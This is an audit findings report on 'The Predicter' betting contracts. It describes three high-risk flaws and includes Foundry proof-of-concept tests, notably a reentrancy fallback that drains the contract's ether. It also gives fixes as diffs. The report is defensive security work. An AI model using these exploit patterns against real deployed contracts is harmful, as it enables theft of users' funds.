# First Flight #20: The Predicter - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Reentrancy vulnerability in `predicter.sol::cancelRegistration()` method](#H-01)
    - ### [H-02.  Users Can Make Predictions Without Paying the Entrance Fee](#H-02)
    - ### [H-03. Prediction Manipulation Vulnerability in ScoreBoard.sol After Result Has Been Known](#H-03)

- ## Low Risk Findings
    - ### [L-01.  Lack of Event Emission for State-Changing Functions](#L-01)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #20

### Dates: Jul 18th, 2024 - Jul 25th, 2024

[See more contest details here](https://codehawks.cyfrin.io/c/2024-07-the-predicter)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 3
- Medium: 0
- Low: 1


# High Risk Findings

## <a id='H-01'></a>H-01. Reentrancy vulnerability in `predicter.sol::cancelRegistration()` method            



## Summary

Vulnerability Details\
A malicious player registered for the game can exploit a vulnerability by repeatedly cancelling their registration  `cancelRegistration()`and calling back the predictor contract after receiving their refund. This process drains all the funds in the contract due to a missing check-effect-interaction pattern.
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Impact
This exploit allows a malicious player to drain all the funds in the contract due to a missing check-effect-interaction pattern. As a result, the contract becomes useless for its intended purpose, and honest players lose their funds to the malicious player.
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## coded POC

```Solidity
function test_AttackerCanSteallAllFunds() public {
        for (uint256 i = 0; i < 30; ++i) {
            address user = makeAddr(string.concat("user", Strings.toString(i)));
            vm.startPrank(user);
            vm.deal(user, 1 ether);
            thePredicter.register{value: 0.04 ether}();
            vm.stopPrank();

            vm.startPrank(organizer);
            thePredicter.approvePlayer(user);
            vm.stopPrank();
        }

        vm.label(address(this), "Attacker");

        // malicious player registering after all 30 players did
         vm.deal(address(this),  0.04 ether);
            thePredicter.register{value: 0.04 ether}();

    //check balance before cancel
    emit log_named_decimal_uint("Attacker balance before cancelling = ", address(this).balance, 18);
    emit log_named_decimal_uint("ThePredicter balance before cancelling = ", address(thePredicter).balance, 18);

     // cancel registration
     thePredicter.cancelRegistration();

     //check balance after malicious user cancel
       emit log_named_decimal_uint("Attacker balance after cancelling = ", address(this).balance, 18);

       emit log_named_decimal_uint("ThePredicter balance after cancelling = ", address(thePredicter).balance, 18);
        
    }
    fallback() external payable{
        if (address(thePredicter).balance > 0)
      thePredicter.cancelRegistration();  
    }
```

Add the code above to ThePredicter.test.sol and run with `forge t --mt test_AttackerCanSteallAllFunds -vv`To generate the traces below \
\
`[PASS] test_AttackerCanSteallAllFunds() (gas: 2094527) Logs:`\
`Attacker balance before cancelling = : 0.000000000000000000`\
`ThePredicter balance before cancelling = : 1.240000000000000000`\
`Attacker balance after cancelling = : 1.240000000000000000`\
`ThePredicter balance after cancelling = : 0.000000000000000000`
----------------------------------------------------------------

\
Tools Used\
Manual Review / foundry 
------------------------

Recommendations\
since a user who has no funds in the contract has the `unknown` status, it is recommended to change the status of user back to `unknown` before sending back the funds to the user.
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

```diff
 function cancelRegistration() public {
    
        if (playersStatus[msg.sender] == Status.Pending) {
+        playersStatus[msg.sender] = Status.Unknown;
            (bool success, ) = msg.sender.call{value: entranceFee}("");
            require(success, "Failed to withdraw");
            playersStatus[msg.sender] = Status.Canceled;
            return;
        }
        revert ThePredicter__NotEligibleForWithdraw();
    }
```

running the coded poc agains this changes will prevent the reentrancy from happening.\
In addition to protecting the protocol, it is also recommended to use non-reentrant modifier to guard against public functions:
-------------------------------------------------------------------------------------------------------------------------------

## <a id='H-02'></a>H-02.  Users Can Make Predictions Without Paying the Entrance Fee            



## Summary

A vulnerability was identified that allows any random user to make predictions without registering as a Player. This behavior bypasses the intended access control mechanisms

## Vulnerability Details

The `makePrediction` function in the `ThePredicter` contract does not verify if the user has registered and paid the entrance fee before allowing them to make a prediction. As a result, users can exploit this vulnerability to participate in the prediction process without contributing to the prize fund, thereby receiving an unfair advantage over honest players who follow the correct registration process.

## POC

```solidity
 function test_makePrediction_without_EntranceFee() public {
        vm.startPrank(stranger);
        vm.warp(1);
        vm.deal(stranger, 1 ether);

        thePredicter.makePrediction{value: 0.0001 ether}(
            0,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();
      assertEq(address(thePredicter).balance,0.0002 ether);
    }
```

Add the code above to predicter.test.sol and run with `forge t --mc ThePredicterPOCTest -vvvvv` to see the transaction traces.\
Impact
------

Malicious users can repeatedly exploit this vulnerability to make predictions without financial commitment, potentially manipulating the betting outcomes and disrupting the intended operation of the protocol.

## Tools Used

Manual Review / Foundry

## Recommendations

Implement a check in the `makePrediction` function to verify if the caller has registered and paid the entrance fee before processing their prediction.

```diff
  function makePrediction(
        uint256 matchNumber,
        ScoreBoard.Result prediction
    ) public payable {
        if (msg.value != predictionFee) {
            revert ThePredicter__IncorrectPredictionFee();
        }
+       if(playersStatus[msg.sender] != Status.Approved){
+         revert ThePredicter__UnauthorizedAccess();
+        }

        if (block.timestamp > START_TIME + matchNumber * 68400 - 68400) {
            revert ThePredicter__PredictionsAreClosed();
        }

        scoreBoard.confirmPredictionPayment(msg.sender, matchNumber);
        scoreBoard.setPrediction(msg.sender, matchNumber, prediction);
    }
```

## <a id='H-03'></a>H-03. Prediction Manipulation Vulnerability in ScoreBoard.sol After Result Has Been Known            



## Summary

This report identifies a critical vulnerability in the `setPrediction()` function within the `ScoreBoard.sol` contract. The current implementation allows players to change their predictions after each match result is known, due to the lack of proper access control in the `setPrediction()` function. This undermines the integrity and fairness of the betting system.

## Vulnerability Details

The `setPrediction()` function, which sets a player's prediction for a given match, lacks adequate access control. As a result, players can alter their predictions after the match results have been entered by the Organizer. This allows for unfair manipulation of the game, as players can retroactively change their predictions to match the actual results, ensuring they always score points.

## Impact

* **Fairness Compromised:** Players can manipulate their predictions to ensure they always score points, compromising the fairness of the game.

- **Integrity Undermined:** The betting system's integrity is undermined, as the scoring no longer reflects players' actual predictions made before the match.

\
POC
---

```solidity
 function test_Prediction_can_be_Manipulated_After_Result() public {
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.deal(stranger3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);
        thePredicter.approvePlayer(stranger3);
        vm.stopPrank();

        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(stranger3);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();
        
         vm.startPrank(stranger);
         //expect withdraw to revert because stranger 1 has negative point allthrough
         vm.expectRevert( abi.encodeWithSelector(
                ThePredicter__NotEligibleForWithdraw.selector
            ));
        thePredicter.withdraw();
        //update prediction to the correct score
         scoreBoard.setPrediction(stranger, 1, ScoreBoard.Result.First);
         scoreBoard.setPrediction(stranger, 2, ScoreBoard.Result.First);
         scoreBoard.setPrediction(stranger, 3, ScoreBoard.Result.First);
        thePredicter.withdraw();
        vm.stopPrank();
        assertEq(stranger.balance, 1.0077 ether);

        vm.startPrank(stranger2);
        thePredicter.withdraw();
        vm.stopPrank();
        assertEq(stranger2.balance, 0.9837 ether);
        

        vm.startPrank(stranger3);
        thePredicter.withdraw();
        vm.stopPrank();
        assertEq(stranger3.balance, 1.0077 ether);
        

        
    }
```

Add the function above to `ThePredicter.test.sol` and run with `forge t --mt test_Prediction_can_be_Manipulated_After_Result -vv`\
Tools Used
----------

manual review/Foundry

## Recommendations

**1) Access Control:** Restrict the function so that only authorized addresses, such as thePredicter.sol, can call it.

**2) Time Restriction:** Ensure that predictions can only be set or changed before the match starts. enforcing the time it was called was before the match

```diff
 function setPrediction(
        address player,
        uint256 matchNumber,
        Result result
+    ) public onlyPredicter{
        
-        if (block.timestamp <= START_TIME + matchNumber * 68400 - 68400)
+        if (block.timestamp > START_TIME + matchNumber * 68400 - 68400) {
+            revert ThePredicter__PredictionsAreClosed();
+        }
        
            playersPredictions[player].predictions[matchNumber] = result;
        playersPredictions[player].predictionsCount = 0;
        for (uint256 i = 0; i < NUM_MATCHES; ++i) {
            if (
                playersPredictions[player].predictions[i] != Result.Pending &&
                playersPredictions[player].isPaid[i]
            ) ++playersPredictions[player].predictionsCount;
        }
    }
```



The lack of access control and time restrictions in the `setPrediction()` function poses a critical risk to the integrity and fairness of the betting system. By implementing the suggested controls, this vulnerability can be mitigated, ensuring that predictions are made and locked in before the match starts, maintaining a fair and trustworthy betting protocol.

    


# Low Risk Findings

## <a id='L-01'></a>L-01.  Lack of Event Emission for State-Changing Functions            



## Summary

vent emission in smart contracts is crucial for tracking state changes and providing transparency. Events allow for easier debugging, monitoring, and verification of contract activities by off-chain applications. The contracts `ThePredicter.sol` and `ScoreBoard.sol` lack event emissions for critical state-changing functions, which undermines the ability to audit and track the system's behavior accurately.

**Affected Functions**

**ThePredicter.sol**

* `register()`
* `cancelRegistration()`
* `approvePlayer()`
* `makePrediction()`
* `withdrawPredictionFees()`
* `withdraw()`

**ScoreBoard.sol**

* `setResult()`
* `confirmPredictionPayment()`
* `setPrediction()`
* `clearPredictionsCount()`

####

## Recommendations

The lack of event emission in key functions of `ThePredicter.sol` and `ScoreBoard.sol` contracts significantly impacts the ability to track and audit the contract's operations. By incorporating appropriate events, transparency and accountability can be greatly improved, ensuring all actions within the contracts are visible and verifiable.



